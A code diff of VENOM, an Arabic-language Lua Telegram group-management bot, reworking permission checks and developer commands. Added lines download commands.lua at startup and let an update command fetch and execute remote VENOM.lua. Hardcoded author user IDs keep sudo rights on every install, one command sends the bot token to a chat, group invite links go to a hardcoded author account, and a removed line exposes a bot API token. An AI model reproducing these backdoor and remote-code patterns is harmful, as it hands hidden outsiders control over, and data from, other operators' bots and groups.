@@ -169,6 +169,11 @@ ban_id = sudos.token:match("(%d+)")
 token = sudos.token 
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
+io.popen("mkdir File_Bot") 
+io.popen("cd File_Bot && rm -rf commands.lua.1") 
+io.popen("cd File_Bot && rm -rf commands.lua.2") 
+io.popen("cd File_Bot && rm -rf commands.lua.3") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/VENOM197/Venom/main/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -181,7 +186,8 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-dev_users = {1804133252,1360140225,944353237,1896382059}   
+
+dev_users = {1804133252}   
 function Developers(msg)  
 local VENOM = false  
 for k,v in pairs(dev_users) do  
@@ -191,13 +197,7 @@ end
 end  
 return VENOM  
 end 
-function banda(msg)  
-local idbot = false  
-if tonumber(msg.sender_user_id_) == tonumber(1804133252) then  
-idbot = true    
-end  
-return idbot  
-end
+
 sudo_users = {SUDO,1804133252,1360140225,944353237,1896382059}   
 function SudoBot(msg)  
 local VENOM = false  
@@ -208,25 +208,18 @@ end
 end  
 return VENOM  
 end 
-function msa3d(msg) 
-local hash = bot_data:sismember(ban_id.."msa3d:ban", msg.sender_user_id_) 
+function Devban(msg) 
+local hash = bot_data:sismember(ban_id.."Dev:ban:2", msg.sender_user_id_) 
 if hash or SudoBot(msg) then  
 return true  
 else  
 return false  
 end  
 end
-function Devban(msg) 
-local hash = bot_data:sismember(ban_id.."Dev:ban:2", msg.sender_user_id_) 
-if hash or SudoBot(msg) or msa3d(msg) then  
-return true  
-else  
-return false  
-end  
-end
+
 function Dev(msg) 
 local hash = bot_data:sismember(ban_id.."Dev:ban:2", msg.sender_user_id_) 
-if hash then  
+if hash  then  
 return true  
 else  
 return false  
@@ -241,7 +234,7 @@ return idbot
 end
 function Sudo(msg) 
 local hash = bot_data:sismember(ban_id..'Sudo:User', msg.sender_user_id_) 
-if hash or SudoBot(msg) or Devban(msg) then  
+if hash or SudoBot(msg) or Devban(msg) or Bot(msg)  then  
 return true  
 else  
 return false  
@@ -249,7 +242,7 @@ end
 end
 function moall(msg) 
 local hash = bot_data:sismember(ban_id..'Sudo:User', msg.sender_user_id_) 
-if hash or SudoBot(msg) or Devban(msg) then  
+if hash or SudoBot(msg) or Devban(msg) or Bot(msg)  then  
 return true  
 else  
 return false  
@@ -257,7 +250,7 @@ end
 end
 function onall(msg) 
 local hash = bot_data:sismember(ban_id..'Sudo:User', msg.sender_user_id_) 
-if hash or SudoBot(msg) or Devban(msg) then  
+if hash or SudoBot(msg) or Devban(msg) or Bot(msg)  then  
 return true  
 else  
 return false  
@@ -265,7 +258,7 @@ end
 end
 function CoSu(msg)
 local hash = bot_data:sismember(ban_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
-if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) then   
+if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or Bot(msg)  then   
 return true 
 else 
 return false 
@@ -273,7 +266,7 @@ end
 end
 function BasicConstructor(msg)
 local hash = bot_data:sismember(ban_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
-if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or CoSu(msg) then   
+if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
 return true 
 else 
 return false 
@@ -281,7 +274,7 @@ end
 end
 function Constructor(msg)
 local hash = bot_data:sismember(ban_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
-if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) then       
+if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -289,7 +282,7 @@ end
 end
 function Manager(msg)
 local hash = bot_data:sismember(ban_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) then       
+if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -297,7 +290,7 @@ end
 end
 function onall(msg)
 local hash = bot_data:sismember(ban_id..'onall'..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) then       
+if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -305,7 +298,7 @@ end
 end
 function cleaner(msg)
 local hash = bot_data:sismember(ban_id.."banda:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) then       
+if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -313,7 +306,7 @@ end
 end
 function Mod(msg)
 local hash = bot_data:sismember(ban_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) then       
+if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -321,12 +314,13 @@ end
 end
 function Special(msg)
 local hash = bot_data:sismember(ban_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
-if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) then       
+if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
 return true 
 else 
 return false 
 end 
 end
+
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1804133252) then  
 var = true 
@@ -339,8 +333,6 @@ var = true
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(ban_id) then
-var = true  
-elseif bot_data:sismember(ban_id.."msa3d:ban", user_id) then
 var = true  
 elseif bot_data:sismember(ban_id.."Dev:ban:2", user_id) then
 var = true  
@@ -384,14 +376,12 @@ elseif tonumber(user_id) == tonumber(1360140225) then
 var = 'مبرمج افايره'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
+elseif bot_data:sismember(ban_id.."Dev:ban:2", user_id) then
+var = "المطور الثانوي"  
 elseif tonumber(user_id) == tonumber(ban_id) then  
 var = 'البوت'
-elseif bot_data:sismember(ban_id.."msa3d:ban", user_id) then
-var = "مساعد"
-elseif bot_data:sismember(ban_id.."Dev:ban:2", user_id) then
-var = "المطور الثانوي"
 elseif bot_data:sismember(ban_id..'Sudo:User', user_id) then
-var = bot_data:get(ban_id.."Sudo:Rd"..msg.chat_id_) or 'المطور'
+var = bot_data:get(ban_id.."Sudo:Rd"..msg.chat_id_) or 'المطور'  
 elseif bot_data:sismember(ban_id..'CoSu'..chat_id, user_id) then
 var = bot_data:get(ban_id.."CoSu:Rd"..msg.chat_id_) or 'مالك'
 elseif bot_data:sismember(ban_id..'Basic:Constructor'..chat_id, user_id) then
@@ -1015,14 +1005,6 @@ function SourceVENOM(msg,data) -- بداية العمل
 if msg then
 local text = msg.content_.text_
 --------------------------------------------------------------------------------------------------------------
---[[if msg.sender_user_id_ then
-ban = https.request('https://devdeiveddev.ml/api/tele/source/ban.php?id='..msg.sender_user_id_)
-YY = JSON.decode(ban)
-if YY.status == 'band' then
-DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
-chat_kick(msg.chat_id_,msg.sender_user_id_) 
-end
-end]]
 if text == ("الردود المتعدده") and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = bot_data:get(ban_id..'text:ch:user')
@@ -1704,6 +1686,7 @@ local keyboard = {
 {'جلب المشتركين','جلب النسخه'},
 {'جلب المطورين','جلب التوكن'},
 {'تحديث السورس ','الاصدار'},
+{'معلومات السيرفر'},
 {'الغاء'},
 }
 send_inline_key(msg.chat_id_,bl,keyboard)
@@ -1857,7 +1840,23 @@ if text == 'مسح كليشه ستارت' and Devban(msg) then
 bot_data:del(ban_id..'Start:Bot') 
 send(msg.chat_id_, msg.id_,' ● تم مسح كليشه ستارت')
 end
-if text == 'تحديث السورس' and Devban(msg) then 
+if text == 'معلومات السيرفر' and Devban(msg) then 
+send(msg.chat_id_, msg.id_, io.popen([[
+linux_version=`lsb_release -ds`
+memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
+HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
+CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
+uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
+echo '📟l •⊱ 「 نظام التشغيل 」 ⊰•\n* '"$linux_version"'*' 
+echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 🖨️l •⊱ 「 الذاكره العشوائيه 」  ⊰•\n「* '"$memUsedPrc"'*」'
+echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 💾l •⊱ 「 وحـده الـتـخـزيـن 」  ⊰•\n「* '"$HardDisk"'*」'
+echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 🖥️l •⊱ 「 موقـع الـسـيـرفـر 」 ⊰•\n「*»» '`curl http://th3boss.com/ip/location`'*」'
+echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 🕹️l •⊱ 「 الـمــعــالــج 」  ⊰•\n「* '"`grep -c processor /proc/cpuinfo`""Core ~ 「$CPUPer%」 "'*」'
+echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 👨🏾‍🔧l •⊱ 「 الــدخــول 」  ⊰•\n「* '`whoami`'*」'
+echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 🔌l •⊱ 「 مـده تـشغيـل الـسـيـرفـر 」 ⊰•\n「* '"$uptime"'*」'
+]]):read('*all'))  
+end
+if text == 'تحديث السورس ' and Devban(msg) then 
 os.execute('rm -rf VENOM.lua')
 os.execute('wget https://raw.githubusercontent.com/VENOM197/Venom/main/VENOM.lua')
 send(msg.chat_id_, msg.id_,' ● تم تحديث السورس')
@@ -2068,7 +2067,11 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
-if text == "توكن البوت" and banda(msg) or text == 'جلب التوكن' and banda(msg) then 
+if text == "توكن البوت" and Developers(msg) or text == 'جلب التوكن' and Developers(msg) then 
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'هذا الامر خاص بي باندا فقط')
+return false
+end
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' ..token) 
 send(msg.chat_id_, msg.id_,' ') 
@@ -2107,7 +2110,7 @@ bot_data:setex(ban_id..'Set:Name:Bot'..msg.sender_user_id_,300,true)
 send(msg.chat_id_, msg.id_," ● ارسل اليه الاسم الان ")
 return false
 end
-if text == ("الثانوين") and msa3d(msg) then
+if text == ("الثانوين") and SudoBot(msg) then
 local list = bot_data:smembers(ban_id.."Dev:ban:2")
 t = "\n ● قائمة مطورين الثانويين للبوت \n●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n"
 for k,v in pairs(list) do
@@ -2125,28 +2128,28 @@ send(msg.chat_id_, msg.id_, t)
 end
 
 
-if text == 'الاحصائيات' and msa3d(msg) then 
+if text == 'الاحصائيات' and SudoBot(msg) then 
 local Groups = bot_data:scard(ban_id..'Chek:Groups')  
 local Users = bot_data:scard(ban_id..'User_Bot')  
 Text = ' ● الاحصائيات  \n'..' ● عدد الجروبات  ⋙ {'..Groups..'}'..'\n ●  عدد المشتركين  ⋙ {'..Users..'}'
 send(msg.chat_id_, msg.id_,Text) 
 return false
 end
-if text == 'المشتركين' and msa3d(msg) then 
+if text == 'المشتركين' and SudoBot(msg) then 
 local Groups = bot_data:scard(ban_id..'Chek:Groups')  
 local Users = bot_data:scard(ban_id..'User_Bot')  
 Text = '\n ● المشتركين ⋙{`'..Users..'`}'
 send(msg.chat_id_, msg.id_,Text) 
 return false
 end
-if text == 'الجروبات ' and msa3d(msg) then 
+if text == 'الجروبات ' and SudoBot(msg) then 
 local Groups = bot_data:scard(ban_id..'Chek:Groups')  
 local Users = bot_data:scard(ban_id..'User_Bot')  
 Text = '\n ● الجروبات ⋙{`'..Groups..'`}'
 send(msg.chat_id_, msg.id_,Text) 
 return false
 end
-if text == ("المطورين") and msa3d(msg) then
+if text == ("المطورين") and SudoBot(msg) then
 local list = bot_data:smembers(ban_id..'Sudo:User')
 t = "\n ● قائمة المطورين \n●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n"
 for k,v in pairs(list) do
@@ -2162,7 +2165,7 @@ t = " ● لا يوجد مطورين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("قائمه العام") and msa3d(msg) then
+if text == ("قائمه العام") and SudoBot(msg) then
 local list = bot_data:smembers(ban_id..'GDRG:User')
 t = "\n ● قائمه المحظورين عام \n●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n"
 for k,v in pairs(list) do
@@ -2179,7 +2182,7 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text == ("قائمه الكتم العام") and msa3d(msg) then
+if text == ("قائمه الكتم العام") and SudoBot(msg) then
 local list = bot_data:smembers(ban_id..'Gmute:User')
 t = "\n ● قائمة المكتومين عام \n●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n"
 for k,v in pairs(list) do
@@ -2196,22 +2199,22 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text=="اذاعه خاص " and msg.reply_to_message_id_ == 0 and msa3d(msg) then 
+if text=="اذاعه خاص " and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
 bot_data:setex(ban_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ● ارسل الان اذاعتك؟ \n ● للخروج ارسل الغاء ")
 return false
 end 
-if text=="اذاعه " and msg.reply_to_message_id_ == 0 and msa3d(msg) then 
+if text=="اذاعه " and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
 bot_data:setex(ban_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ● ارسل الان اذاعتك؟ \n ● للخروج ارسل الغاء ")
 return false
 end  
-if text=="اذاعه بالتوجيه " and msg.reply_to_message_id_ == 0  and msa3d(msg) then 
+if text=="اذاعه بالتوجيه " and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
 bot_data:setex(ban_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ● ارسل لي التوجيه الان")
 return false
 end 
-if text=="اذاعه بالتوجيه خاص " and msg.reply_to_message_id_ == 0  and msa3d(msg) then 
+if text=="اذاعه بالتوجيه خاص " and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
 bot_data:setex(ban_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ● ارسل لي التوجيه الان")
 return false
@@ -2219,7 +2222,7 @@ end
 if text == 'جلب النسخه' and Devban(msg) then 
 GetFile_Bot(msg)
 end
-if text == "تنظيف المشتركين " and msa3d(msg) then 
+if text == "تنظيف المشتركين " and SudoBot(msg) then 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = bot_data:get(ban_id..'text:ch:user')
 if textchuser then
@@ -2255,7 +2258,7 @@ end,nil)
 end
 return false
 end
-if text == "تنظيف الجروبات " and msa3d(msg) then 
+if text == "تنظيف الجروبات " and SudoBot(msg) then 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = bot_data:get(ban_id..'text:ch:user')
 if textchuser then
@@ -2821,19 +2824,16 @@ local NameChat = NameChat:gsub("`","")
 local NameChat = NameChat:gsub("*","") 
 local NameChat = NameChat:gsub("{","") 
 local NameChat = NameChat:gsub("}","") 
-local chatid = msg.chat_id_:gsub("-100","") 
-local msg_id = msg.id_/2097152/0.5
 local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
 if LinkGp.ok == true then 
 LinkGroup = LinkGp.result
 else
 LinkGroup = 'لا يوجد'
 end
-sendText(1804133252,"●. هناك شخص يريدك يا سيدي باندا \n●الشخص  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب {`"..msg.chat_id_.."`}\n●رابط الجروب \n ["..LinkGroup.."]\n●رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.." ",0,'md')
+sendText(1804133252,"●. هناك شخص يريدك يا سيدي باندا \n●الشخص  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب {`"..msg.chat_id_.."`}\n●رابط الجروب \n ["..LinkGroup.."] ",0,'md')
 end,nil)
 end,nil)
 end
-
 
 
 if text and text:match("^ديفيد$") or text and text:match("^ديفد$") or text and text:match("^devid$") then
@@ -3634,6 +3634,21 @@ end,nil)
 end
 -------------------------------------------------------------------------------------------------------------
 
+if text == 'تحديث السورس' and Devban(msg) then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = bot_data:get(ban_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,' ● لا تستطيع استخدام البوت \n ●  يرجى الاشتراك بالقناه اولا \n ●  اشترك هنا ['..bot_data:get(ban_id..'add:ch:username')..']')
+end
+return false
+end
+os.execute('rm -rf VENOM.lua')
+os.execute('wget https://raw.githubusercontent.com/VENOM197/Venom/main/VENOM.lua')
+send(msg.chat_id_, msg.id_,' ● تم تحديث السورس')
+dofile('VENOM.lua')  
+end
 
 if text and text:match("^تغير الاشتراك$") and Devban(msg) then  
 bot_data:setex(ban_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
@@ -3680,11 +3695,11 @@ send(msg.chat_id_, msg.id_, " ● لا يوجد قناة في الاشتراك �
 end
 return false  
 end
-if text == "++-+++" and msa3d(msg) then
+if text == "++-+++" and SudoBot(msg) then
 send(msg.chat_id_, msg.id_, ' ● تم تفعيل الالعاب')
 bot_data:set(ban_id.."AL:AddS0FI:stats","✔")
 end
-if text == "+-+-+-+-+&--" and msa3d(msg) then
+if text == "+-+-+-+-+&--" and SudoBot(msg) then
 send(msg.chat_id_, msg.id_, ' ● تم تعطيل الالعاب')
 bot_data:set(ban_id.."AL:AddS0FI:stats","✖")
 end
@@ -3934,25 +3949,9 @@ https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. 
 end
 end
 ----------------------------------------------------------------- انتهئ الاوامر الجديدة
-if text == 'معلومات السيرفر' or text == 'السيرفر' and Developers(msg) then 
-send(msg.chat_id_, msg.id_, io.popen([[
-linux_version=`lsb_release -ds`
-memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
-HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
-CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
-uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
-echo '📟l •⊱ 「 نظام التشغيل 」 ⊰•\n* '"$linux_version"'*' 
-echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 🖨️l •⊱ 「 الذاكره العشوائيه 」  ⊰•\n「* '"$memUsedPrc"'*」'
-echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 💾l •⊱ 「 وحـده الـتـخـزيـن 」  ⊰•\n「* '"$HardDisk"'*」'
-echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 🖥️l •⊱ 「 موقـع الـسـيـرفـر 」 ⊰•\n「*»» '`curl http://th3boss.com/ip/location`'*」'
-echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 🕹️l •⊱ 「 الـمــعــالــج 」  ⊰•\n「* '"`grep -c processor /proc/cpuinfo`""Core ~ 「$CPUPer%」 "'*」'
-echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 👨🏾‍🔧l •⊱ 「 الــدخــول 」  ⊰•\n「* '`whoami`'*」'
-echo '●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n 🔌l •⊱ 「 مـده تـشغيـل الـسـيـرفـر 」 ⊰•\n「* '"$uptime"'*」'
-]]):read('*all'))  
-end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
 local Text = [[
-•𝚆𝙴𝙻𝙲𝙾𝙼𝙴 ??𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙴𝙽𝙾𝙼⇣
+•𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙴𝙽𝙾𝙼⇣
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -3963,48 +3962,47 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/41&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
-local tokenget = '1910742031:AAGxfqrJRSDnw2qN9akXVskce2P8gw7pUWI'
 if text == 'دونجول' or text == "دونجل" then
-local id = '1896382059'
-local urrl = https.request('https://api.telegram.org/bot'..tokenget..'/getchat?chat_id='..id)
-local json = JSON.decode(urrl)
-local name = json.result.first_name
-local user = json.result.username
-local bio = json.result.bio
-keyboard = {} 
-keyboard.inline_keyboard = {{{text = name,url="t.me/"..user}},}
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..user..'&caption=' .. URL.escape(bio).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+local Text = [[
+ المبرمج دونجول
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {{{text = '  𓌹 ˹ＤＯＮＧＯＬ¹˼ 𓌺 ',url="t.me/UU_DO_N"}},}
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/UU_DO_N&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
+
 if text == 'ديفيد' or text == 'دفيد' then
-local id = '1360140225'
-local urrl = https.request('https://api.telegram.org/bot'..tokenget..'/getchat?chat_id='..id)
-local json = JSON.decode(urrl)
-local name = json.result.first_name
-local user = json.result.username
-local bio = json.result.bio
+local Text = [[
+{ المبرمج ديفيد } ↓
+
+]]
 keyboard = {} 
-keyboard.inline_keyboard = {{{text = name,url="t.me/"..user}},}
+keyboard.inline_keyboard = {
+{{text = '˹ＤＥＶＩＤ༈˼',url="t.me/de_vi_d"}},
+}
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..user..'&caption=' .. URL.escape(bio).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/de_vi_d&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'أحمد' or text == 'احمد' or text == 'احمد عياد' then
-local id = '944353237'
-local urrl = https.request('https://api.telegram.org/bot'..tokenget..'/getchat?chat_id='..id)
-local json = JSON.decode(urrl)
-local name = json.result.first_name
-local user = json.result.username
-local bio = json.result.bio
+local Text = [[
+المبرمج احمد عياد للتواصل مع
+اتبع الازرار إلي في الاسفل↓
+]]
 keyboard = {} 
-keyboard.inline_keyboard = {{{text = name,url="t.me/"..user}},}
+keyboard.inline_keyboard = {
+{{text = '˹𖢜 𝗔𝗛𝗠𝗘𝗗 ⤶˼',url="t.me/AY_AHD"}},
+}
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..user..'&caption=' .. URL.escape(bio).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AY_AHD&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
+
 if text == 'باندا' or text == 'Banda' or text == 'banda' then
 local Text = [[
 ᴘʀᴏɢʀᴀᴍᴍᴇʀ ᴘᴀɴᴅᴀ
  ᴛᴏ ᴄᴏᴍᴍụɴɪᴄᴀᴛᴇ ᴛᴏɢᴇᴛʜᴇʀ, 
 ғᴏʟʟᴏᴡ ᴛʜᴇ ʙụᴛᴛᴏɴѕ ʟᴏᴡᴇʀ  
+:- @QSban 𝅘𝅥𝅯
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -4018,12 +4016,15 @@ end
 
 
 
-if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and msa3d(msg) then 
+if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
 bot_data:setex(ban_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ● ارسل الان اذاعتك؟ \n ● للخروج ارسل الغاء ")
 return false
 end
-if text == "£¢€$$__€€¢¥^^¥€" and banda(msg) then
+if text == "£¢€$$__€€¢¥^^¥€" and Developers(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+return false
+end
 tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000
 },function(ta,VENOM)
 local t = "\nツ قائمة الاعضاء \n●○━━━━ꪜꫀꪀꪮꪑ━━━━○● \n"
@@ -4038,7 +4039,7 @@ end
 end,nil)
 end
 
-if text == "توكن البوت" and banda(msg) then 
+if text == "توكن البوت" and Developers(msg) then 
 if not SudoBot(msg) then
 send(msg.chat_id_, msg.id_,'هذا الامر خاص بي باندا فقط')
 return false
@@ -5421,7 +5422,7 @@ else
 tdcli_function ({ID = "GetUser",user_id_ = SUDO,},function(arg,result) 
 local function taha(extra, taha, success)
 if taha.photos_[0] then
-local Name = '〈 المطور 〉 - ['..result.first_name_..'](tg://user?id='..result.id_..')\n'
+local Name = '〈 المطور 〉 -  \n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -6612,7 +6613,7 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text == ("حظر عام") and msg.reply_to_message_id_ and msa3d(msg) then
+if text == ("حظر عام") and msg.reply_to_message_id_ and SudoBot(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = bot_data:get(ban_id..'text:ch:user')
 if textchuser then
@@ -6647,10 +6648,6 @@ if tonumber(result.sender_user_id_) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ● لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if bot_data:sismember(ban_id..'msa3d:ban', result.sender_user_id_) then
-send(msg.chat_id_, msg.id_, " ● لا تسطيع حظر مساعد عام")
-return false 
-end
 bot_data:sadd(ban_id..'GDRG:User', result.sender_user_id_)
 chat_kick(result.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
@@ -6663,7 +6660,7 @@ end
